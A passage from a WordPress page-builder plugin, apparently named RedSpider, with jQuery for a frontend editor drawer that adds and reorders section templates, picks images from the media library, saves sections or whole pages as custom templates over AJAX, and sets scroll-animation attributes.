        item.fadeOut(300, function() { item.remove(); });
      }
    });

    // Add Template
    $('#rs-drawer-add-template-btn').click(function(e) {
      e.preventDefault();
      var slug = $('#rs-drawer-template-select').val();
      if (!slug) {
        alert('Please select a layout layout to add.');
        return;
      }
      var html = rsTemplates[slug];
      var label = $('#rs-drawer-template-select option:selected').text();
      var count = $('.rs-frontend-drawer .rs-accordion-item').length;
      var targetId = 'rs-drawer-body-new-' + count;

      var newAccordion = `
        <div class="rs-accordion-item new-section-added" draggable="true" style="display:none; border-color: #2ecc71;">
          <button type="button" class="rs-accordion-header" data-target="${targetId}">
            <div class="rs-drag-handle" title="Drag to Reorder">⋮⋮</div>
            <span class="rs-accordion-title">[NEW] ${label}</span>
            <div class="rs-accordion-controls">
              <span class="rs-control-btn rs-move-up" title="Move Up">↑</span>
              <span class="rs-control-btn rs-move-down" title="Move Down">↓</span>
              <span class="rs-control-btn rs-duplicate" title="Duplicate Section">❐</span>
              <span class="rs-control-btn rs-delete" title="Delete Section">🗑</span>
            </div>
            <span class="rs-accordion-icon">▼</span>
          </button>
          <div id="${targetId}" class="rs-accordion-body">
            <div class="rs-accordion-content">
              <div class="rs-new-notice">
                <strong>✓ Section template loaded successfully!</strong>
                <p>Save changes to automatically parse and configure editable headings, images, and links inside this section.</p>
              </div>
              <textarea name="section_htmls[]" class="rs-section-html" style="display:none;">${escapeHtml(html)}</textarea>
            </div>
          </div>
        </div>
      `;

      $('.rs-frontend-drawer .rs-sections-accordion').append(newAccordion);
      var appended = $('.rs-frontend-drawer .rs-accordion-item').last();
      appended.fadeIn(400);
      
      $('.rs-drawer-scrollable').animate({
        scrollTop: $('.rs-frontend-drawer .rs-sections-accordion')[0].scrollHeight
      }, 500);
    });

    function escapeHtml(string) {
      return String(string).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;').replace(/'/g, '&#039;');
    }

    // Media library handler
    $(document).on('click', '.rs-frontend-drawer .redspider-upload-btn', function(e) {
      e.preventDefault();
      var button = $(this);
      var index = button.data('index');
      var type = button.data('type');
      
      var custom_uploader = wp.media({
        title: 'Select RedSpider Asset Image',
        button: { text: 'Use Selected Image' },
        multiple: false
      });

      custom_uploader.on('select', function() {
        var attachment = custom_uploader.state().get('selection').first().toJSON();
        if (type === 'bg_images') {
          $('#drawer-bg-img-input-' + index).val(attachment.url);
          $('#drawer-bg-img-preview-' + index).attr('src', attachment.url);
        } else {
          $('#drawer-img-input-' + index).val(attachment.url);
          $('#drawer-img-preview-' + index).attr('src', attachment.url);
        }
      });
      custom_uploader.open();
    });

    // Save Section/Page as Template
    function saveTemplate(name, html) {
      var nonce = $('#redspider_editor_nonce').val();
      $.ajax({
        url: ajaxurl,
        type: 'POST',
        data: {
          action: 'redspider_save_custom_template',
          name: name,
          html: html,
          security: nonce
        },
        success: function(response) {
          if (response.success) {
            rsTemplates['custom_' + response.data.slug] = html;
            var group = $('#rs-drawer-custom-templates-group');
            group.show().append('<option value="custom_' + response.data.slug + '">' + response.data.name + '</option>');
            alert('Template "' + response.data.name + '" saved successfully!');
          } else {
            alert('Error: ' + response.data);
          }
        },
        error: function() {
          alert('AJAX request failed.');
        }
      });
    }

    $(document).on('click', '.rs-frontend-drawer .rs-save-template', function(e) {
      e.stopPropagation();
      var item = $(this).closest('.rs-accordion-item');
      var html = item.find('.rs-section-html').val();
      var name = prompt('Enter a name for this Section Template:');
      if (name && name.trim() !== '') {
        saveTemplate(name, html);
      }
    });

    $(document).on('click', '#rs-drawer-save-page-template-btn', function(e) {
      e.preventDefault();
      var pageHtmls = [];
      $('.rs-frontend-drawer .rs-section-html').each(function() {
        pageHtmls.push($(this).val());
      });
      if (pageHtmls.length === 0) {
        alert('No sections available to save.');
        return;
      }
      var name = prompt('Enter a name for this Page Template:');
      if (name && name.trim() !== '') {
        var entireHtml = pageHtmls.join('\n\n');
        saveTemplate(name, entireHtml);
      }
    });

    // Animation change handler
    $(document).on('change', '.rs-frontend-drawer .rs-section-animation-select', function() {
      var val = $(this).val();
      var item = $(this).closest('.rs-accordion-item');
      var textarea = item.find('.rs-section-html');
      var html = textarea.val();
      
      var sectionTagRegex = /<section([^>]*)>/i;
      var match = sectionTagRegex.exec(html);
      if (match) {
        var attrs = match[1];
        attrs = attrs.replace(/\s*data-aos=["\'][^"\']*["\']/gi, '');
        if (val) {
          attrs += ' data-aos="' + val + '"';
        }
        var newHtml = html.replace(sectionTagRegex, '<section' + attrs + '>');
        textarea.val(newHtml);
      }
    });
  });
  </script>

  <?php
}
add_action('wp_footer', 'redspider_editor_frontend_drawer');
